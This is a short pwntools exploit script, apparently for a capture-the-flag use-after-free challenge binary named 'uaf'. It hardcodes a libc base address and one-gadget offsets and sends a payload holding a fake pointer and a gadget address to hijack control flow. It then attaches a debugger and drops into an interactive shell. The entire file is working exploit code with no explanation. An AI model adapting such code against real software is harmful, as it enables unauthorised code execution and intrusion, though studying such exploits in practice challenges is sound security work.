from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./uaf"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"
# sh_addr = 0x400a06
libc_base = 0x7ffff768b000
# sh_addr = libc_base + 0x45226
sh_addr = libc_base + 0x4527a
# sh_addr = libc_base + 0xf0364
# sh_addr = libc_base + 0xf1207
buf_addr = 0x602160
payload = flat([
    buf_addr+8,sh_addr
    # sh_addr
])
gdb.attach(p)
p.sendline(payload)

p.interactive()
